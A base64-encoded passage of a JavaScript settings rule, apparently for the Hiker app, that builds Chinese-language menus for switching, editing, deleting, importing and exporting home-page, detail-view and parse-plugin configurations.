XFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcbiAgICBkZXRhaWxWaWV3TW9kZU1vZHVsZShkLCBkZXRhaWxzVmlld0NvbmZpZ3MpXFxuICAgIGxldCBkZXRhaWxWaWV3U2V0dGluZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5zZXR0aW5nXFxuICAgIGxldCByZXN1bHQgPSBcXFwidG9hc3Q6Ly/or6Xor6bmg4XpobXml6Dorr7nva7pobXpnaJcXFwiO1xcbiAgICBpZiAoZGV0YWlsVmlld1NldHRpbmcpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgaWYgKGRldGFpbFZpZXdTZXR0aW5nLmluZGV4T2YoJ3JldHVybicpID09IC0xKSB0aHJvdyBuZXcgRXJyb3IoJ+W/hemhuyByZXR1cm4gQHJ1bGU9anM6IOaIliAkKCkucnVsZScpO1xcbiAgICAgICAgICAgIGlmIChkZXRhaWxWaWV3U2V0dGluZy5zdGFydHNXaXRoKFxcXCIoXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgZXZhbCgncmVzdWx0ID0gJyArIGRldGFpbFZpZXdTZXR0aW5nKVxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyAnKCgpID0+IHsnICsgZGV0YWlsVmlld1NldHRpbmcgKyAnfSkoKScpXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcbiAgICAgICAgICAgIHJlc3VsdCA9IFxcXCJ0b2FzdDovL+mUmeivr+eahOiuvue9rumhtemdouS7o+eggSzor7fliY3lvoAg5pel5b+XIOafpeeci+mUmeivr+WOn+WboFxcXCJcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfimpnvuI8nLFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxuICAgICAgICB1cmw6IHJlc3VsdFxcbiAgICB9KVxcbn1cXG5cXG4vLyDpppbpobXorr7nva7mqKHlnZdcXG5mdW5jdGlvbiBob21lUGFnZVNldHRpbmdNb2R1bGUoZCkge1xcbiAgICBsZXQgaG9tZVBhZ2VDb25maWdzID0gZ2V0Q29uZmlnKCdob21lUGFnZUNvbmZpZ3MnKTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn6Ieq5a6a5LmJ6aaW6aG1Jy5ib2xkKCksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG4gICAgfSlcXG4gICAgZm9yIChsZXQgY29uZmlnS2V5IG9mIE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykpIHtcXG4gICAgICAgIGlmIChjb25maWdLZXkgPT09ICd1c2UnKSBjb250aW51ZTtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGNvbmZpZ0tleSA9PT0gaG9tZVBhZ2VDb25maWdzLnVzZSA/IFxcXCLigJzigJxcXFwiICsgY29uZmlnS2V5ICsgXFxcIuKAneKAnVxcXCIgOiBjb25maWdLZXksXFxuICAgICAgICAgICAgdXJsOiAkKFxcXCJoaWtlcjovL2VtcHR5I25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShjb25maWdLZXkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcbiAgICAgICAgICAgICAgICBpZiAoY29uZmlnLmhvbWVQYWdlQ29uZmlncy51c2UgPT09IGNvbmZpZ0tleSkge1xcbiAgICAgICAgICAgICAgICAgICAgLy9wdXRNeVZhcihcXFwiaW5wdXRfY29uZmlnX3R5cGVcXFwiLCAn6aaW6aG16YWN572uJylcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9uYW1lXFxcIiwgY29uZmlnS2V5KTtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9jb2RlXFxcIiwgY29uZmlnLmhvbWVQYWdlQ29uZmlnc1tjb25maWdLZXldLmNvbmZpZyk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWhvbWVQYWdlTW9kZUVkaXRQYWdlJztcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBjb25maWcuaG9tZVBhZ2VDb25maWdzLnVzZSA9IGNvbmZpZ0tleVxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5YiH5o2i5oiQ5YqfJ1xcbiAgICAgICAgICAgIH0sIGNvbmZpZ0tleSksXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbidcXG4gICAgICAgIH0pXFxuICAgIH1cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KelScsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj92aWV3PWhvbWVQYWdlTW9kZUVkaXRQYWdlJ1xcbiAgICB9KTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn4p6WJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnICYmIGNvbmZpZ0tleSAhPT0gJ+m7mOiupCcpLCAyKVxcbiAgICAgICAgICAgIC5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV5Yig6Zmk77yBJ1xcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT09IGNvbmZpZy5ob21lUGFnZUNvbmZpZ3MudXNlKSByZXR1cm4gJ3RvYXN0Oi8v6K+l6YWN572u5q2j5Zyo5L2/55So77yM5peg5rOV5Yig6Zmk77yBJ1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJCgn56Gu6K6k5Yig6ZmkXFxcIicgKyBpbnB1dCArICdcXFwi77yfJykuY29uZmlybSgoY29uZmlnLCBjb25maWdLZXkpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBjb25maWcuaG9tZVBhZ2VDb25maWdzW2NvbmZpZ0tleV1cXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIoOmZpCcgKyBjb25maWdLZXkgKyAn5oiQ5YqfJ1xcbiAgICAgICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcbiAgICAgICAgICAgIH0pXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ/Cfk50nLFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxuICAgICAgICB1cmw6ICQoT2JqZWN0LmtleXMoaG9tZVBhZ2VDb25maWdzKS5maWx0ZXIoY29uZmlnS2V5ID0+IGNvbmZpZ0tleSAhPT0gJ3VzZScpLCAyKS5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgICAgIC8vIGlmIChpbnB1dCA9PT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpHvvIEnXFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgbGV0IGNvbmZpZ0tleSA9IGlucHV0O1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9uYW1lXFxcIiwgY29uZmlnS2V5KTtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfY29kZVxcXCIsIGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9aG9tZVBhZ2VNb2RlRWRpdFBhZ2UnO1xcbiAgICAgICAgfSlcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn8J+TpScsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJChcXFwiXFxcIiwgXFxcIuivt+i+k+WFpeWPo+S7pFxcXCIpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBpZiAoIWlucHV0LmluY2x1ZGVzKFxcXCLpppbpobXphY3nva5cXFwiKSkgcmV0dXJuIFxcXCJ0b2FzdDovL+ivpeWPo+S7pOS4jeaYr+mmlumhtemFjee9rlxcXCI7XFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS91dGlscycpKS5ydWxlKVxcbiAgICAgICAgICAgIGxldCBpbXBvcnRDb25maWdzID0gQ29uZmlnVG9vbC5pbXBvcnQoaW5wdXQpO1xcbiAgICAgICAgICAgIGlmICghaW1wb3J0Q29uZmlncykgcmV0dXJuIFxcXCJ0b2FzdDovL+S8vOS5juWHuuS6humUme+8jOivt+WwneivleWGjeasoeWvvOWFpe+9nlxcXCI7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X25hbWVcXFwiLCBpbXBvcnRDb25maWdzLm5hbWUpO1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9jb2RlXFxcIiwgaW1wb3J0Q29uZmlncy5kYXRhLmNvbmZpZyk7XFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2Uvc2V0dGluZy1lZGl0b3I/cnVsZT3pnZLosYYmdmlldz1ob21lUGFnZU1vZGVFZGl0UGFnZSc7XFxuICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OkJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6R77yBJ1xcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gZ2V0Q29uZmlnKCk7XFxuICAgICAgICAgICAgbGV0IHNlbGVjdENvbmZpZyA9IHtcXG4gICAgICAgICAgICAgICAgbmFtZTogaW5wdXQsXFxuICAgICAgICAgICAgICAgIGRhdGE6IGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbaW5wdXRdXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiAkKENvbmZpZ1Rvb2wuZW5jVHlwZUxpc3QsIDIpLnNlbGVjdCgoc2VsZWN0Q29uZmlnKSA9PiB7XFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuIENvbmZpZ1Rvb2wudG9DbGlwYm9hcmQoQ29uZmlnVG9vbC5leHBvcnQoc2VsZWN0Q29uZmlnLm5hbWUsIHNlbGVjdENvbmZpZywgXFxcIummlumhtemFjee9rlxcXCIsIGlucHV0KSlcXG4gICAgICAgICAgICB9LCBzZWxlY3RDb25maWcpXFxuICAgICAgICB9KVxcbiAgICB9KVxcbn1cXG5cXG4vLyDop6PmnpDphY3nva7mqKHlnZdcXG5mdW5jdGlvbiBhbmFseXNpc01vZGVNb2R1bGUoZCwgYW5hbHlzaXNDb25maWdzKSB7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+iHquWumuS5ieino+aekOaPkuS7ticuYm9sZCgpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxuICAgIH0pXFxuICAgIGZvciAobGV0IGNvbmZpZ0tleSBvZiBPYmplY3Qua2V5cyhhbmFseXNpc0NvbmZpZ3MpKSB7XFxuICAgICAgICBpZiAoY29uZmlnS2V5ID09PSAndXNlJykgY29udGludWU7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBjb25maWdLZXkgPT09IGFuYWx5c2lzQ29uZmlncy51c2UgPyBcXFwi4oCc4oCcXFxcIiArIGNvbmZpZ0tleSArIFxcXCLigJ3igJ1cXFwiIDogY29uZmlnS2V5LFxcbiAgICAgICAgICAgIHVybDogJChcXFwiaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoY29uZmlnS2V5ID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSlcXG4gICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5hbmFseXNpc0NvbmZpZ3MudXNlID09PSBjb25maWdLZXkpIHtcXG4gICAgICAgICAgICAgICAgICAgIC8vcHV0TXlWYXIoXFxcImlucHV0X2NvbmZpZ190eXBlXFxcIiwgJ+ino+aekOaPkuS7tumFjee9ricpXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfbmFtZVxcXCIsIGNvbmZpZ0tleSk7XFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfY29kZVxcXCIsIGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X2V4dHJhXFxcIiwgY29uZmlnLmFuYWx5c2lzQ29uZmlnc1tjb25maWdLZXldLmV4dHJhIHx8IFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFwiLCBjb25maWcuYW5hbHlzaXNDb25maWdzW2NvbmZpZ0tleV0uc2V0dGluZyB8fCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWFuYWx5c2lzTW9kZUVkaXRQYWdlJztcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBjb25maWcuYW5hbHlzaXNDb25maWdzLnVzZSA9IGNvbmZpZ0tleVxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5YiH5o2i5oiQ5YqfJ1xcbiAgICAgICAgICAgIH0sIGNvbmZpZ0tleSksXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbidcXG4gICAgICAgIH0pXFxuICAgIH1cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KelScsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWFuYWx5c2lzTW9kZUVkaXRQYWdlJ1xcbiAgICB9KTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn4p6WJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGFuYWx5c2lzQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnICYmIGNvbmZpZ0tleSAhPT0gJ+S4jeino+aekCcgJiYgY29uZmlnS2V5ICE9PSAn5pat5o+SJyksIDIpXFxuICAgICAgICAgICAgLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gJ+S4jeino+aekCcgJiYgaW5wdXQgPT09ICfmlq3mj5InKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6Kej5p6Q5peg5rOV5Yig6Zmk77yBJ1xcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT09IGNvbmZpZy5hbmFseXNpc0NvbmZpZ3MudXNlKSByZXR1cm4gJ3RvYXN0Oi8v6K+l6Kej5p6Q5q2j5Zyo5L2/55So77yM5peg5rOV5Yig6Zmk77yBJ1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJCgn56Gu6K6k5Yig6ZmkXFxcIicgKyBpbnB1dCArICdcXFwi77yfJykuY29uZmlybSgoY29uZmlnLCBjb25maWdLZXkpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBjb25maWcuYW5hbHlzaXNDb25maWdzW2NvbmZpZ0tleV1cXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIoOmZpCcgKyBjb25maWdLZXkgKyAn5oiQ5YqfJ1xcbiAgICAgICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcbiAgICAgICAgICAgIH0pXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ/Cfk50nLFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxuICAgICAgICB1cmw6ICQoT2JqZWN0LmtleXMoYW5hbHlzaXNDb25maWdzKS5maWx0ZXIoY29uZmlnS2V5ID0+IGNvbmZpZ0tleSAhPT0gJ3VzZScpLCAyKVxcbiAgICAgICAgICAgIC5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfkuI3op6PmnpAnICYmIGlucHV0ID09PSAn5pat5o+SJykgcmV0dXJuICd0b2FzdDovL+m7mOiupOino+aekOaXoOazlee8lui+ke+8gSdcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgICAgIGxldCBjb25maWdLZXkgPSBpbnB1dDtcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X25hbWVcXFwiLCBjb25maWdLZXkpO1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfY29kZVxcXCIsIGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfZXh0cmFcXFwiLCBjb25maWcuYW5hbHlzaXNDb25maWdzW2NvbmZpZ0tleV0uZXh0cmEgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfc2V0dGluZ19jb2RlXFxcIiwgY29uZmlnLmFuYWx5c2lzQ29uZmlnc1tjb25maWdLZXldLnNldHRpbmcgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWFuYWx5c2lzTW9kZUVkaXRQYWdlJztcXG4gICAgICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OlJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKFxcXCJcXFwiLCBcXFwi6K+36L6T5YWl5Y+j5LukXFxcIikuaW5wdXQoKCkgPT4ge1xcbiAgICAgICAgICAgIGlmICghaW5wdXQuaW5jbHVkZXMoXFxcIuino+aekOaPkuS7tumFjee9rlxcXCIpKSByZXR1cm4gXFxcInRvYXN0Oi8v6K+l5Y+j5Luk5LiN5piv6Kej5p6Q5o+S5Lu26YWN572uXFxcIjtcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxuICAgICAgICAgICAgbGV0IGltcG9ydENvbmZpZ3MgPSBDb25maWdUb29sLmltcG9ydChpbnB1dCk7XFxuICAgICAgICAgICAgaWYgKCFpbXBvcnRDb25maWdzKSByZXR1cm4gXFxcInRvYXN0Oi8v5Ly85LmO5Ye65LqG6ZSZ77yM6K+35bCd6K+V5YaN5qyh5a+85YWl772eXFxcIjtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfbmFtZVxcXCIsIGltcG9ydENvbmZpZ3MubmFtZSk7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X2NvZGVcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuY29uZmlnKTtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfZXh0cmFcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuZXh0cmEgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuc2V0dGluZyB8fCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2Uvc2V0dGluZy1lZGl0b3I/cnVsZT3pnZLosYYmdmlldz1hbmFseXNpc01vZGVFZGl0UGFnZSc7XFxuICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OkJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGFuYWx5c2lzQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6R77yBJ1xcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gZ2V0Q29uZmlnKCk7XFxuICAgICAgICAgICAgbGV0IHNlbGVjdENvbmZpZyA9IHtcXG4gICAgICAgICAgICAgICAgbmFtZTogaW5wdXQsXFxuICAgICAgICAgICAgICAgIGRhdGE6IGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbaW5wdXRdXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiAkKENvbmZpZ1Rvb2wuZW5jVHlwZUxpc3QsIDIpLnNlbGVjdCgoc2VsZWN0Q29uZmlnKSA9PiB7XFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuIENvbmZpZ1Rvb2wudG9DbGlwYm9hcmQoQ29uZmlnVG9vbC5leHBvcnQoc2VsZWN0Q29uZmlnLm5hbWUsIHNlbGVjdENvbmZpZywgXFxcIuino+aekOaPkuS7tumFjee9rlxcXCIsIGlucHV0KSlcXG4gICAgICAgICAgICB9LCBzZWxlY3RDb25maWcpXFxuICAgICAgICB9KVxcbiAgICB9KVxcbn1cXG5cXG4vLyDop6PmnpDorr7nva7mqKHlnZdcXG5mdW5jdGlvbiBhbmFseXNpc1NldHRpbmdNb2R1bGUoZCkge1xcbiAgICBsZXQgYW5hbHlzaXNDb25maWdzID0gZ2V0Q29uZmlnKCdhbmFseXNpc0NvbmZpZ3MnKTtcXG4gICAgYW5hbHlzaXNNb2RlTW9kdWxlKGQsIGFuYWx5c2lzQ29uZmlncyk7XFxuICAgIC8qKlxcbiAgICAgKiDov5nkuIvpnaLnmoTpg73mmK/mi7/orr7nva7pobXpnaLnmoTphY3nva7lh7rmnaUgZXZhbCDmiafooYzvvIzmnIDnu4jojrflvpfmj5Lku7borr7nva7pobXpnaLnmoQgdXJs77yM6L+Z5LiqIHVybCDlj6/ku6XmmK/nvZHpobXkuZ/lj6/ku6XmmK/kuoznuqfnlYzpnaJcXG4gICAgICovXFxuICAgIGxldCBhbmFseXNpc1NldHRpbmcgPSBhbmFseXNpc0NvbmZpZ3NbYW5hbHlzaXNDb25maWdzLnVzZV0uc2V0dGluZztcXG4gICAgbGV0IHJlc3VsdCA9IFxcXCJ0b2FzdDovL+ivpeaPkuS7tuaXoOiuvue9rumhtemdolxcXCI7XFxuICAgIGlmIChhbmFseXNpc1NldHRpbmcpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgaWYgKGFuYWx5c2lzU2V0dGluZy5pbmRleE9mKCdyZXR1cm4nKSA9PSAtMSkgdGhyb3cgbmV3IEVycm9yKCflv4XpobsgcmV0dXJuIEBydWxlPWpzOiDmiJYgJCgpLnJ1bGUnKTtcXG4gICAgICAgICAgICBpZiAoYW5hbHlzaXNTZXR0aW5nLnN0YXJ0c1dpdGgoXFxcIihcXFwiKSkge1xcbiAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgYW5hbHlzaXNTZXR0aW5nKTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgJygoKSA9PiB7JyArIGFuYWx5c2lzU2V0dGluZyArICd9KSgpJyk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcbiAgICAgICAgICAgIHJlc3VsdCA9IFxcXCJ0b2FzdDovL+mUmeivr+eahOiuvue9rumhtemdouS7o+eggSzor7fliY3lvoAg5pel5b+XIOafpeeci+mUmeivr+WOn+WboFxcXCJcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfimpnvuI8nLFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxuICAgICAgICB1cmw6IHJlc3VsdFxcbiAgICB9KVxcbn1cXG5cXG4vL+iHquWumuS5ieW/q+mAn+aQnOe0ouaooeWdl1xcbmZ1bmN0aW9uIHF1aWNrU2VhcmNoRElZTW9kdWxlKGQsIGNvbmZpZykge1xcbiAgICBsZXQgcXVpY2tTZWFyY2hDb25maWdzID0gZ2V0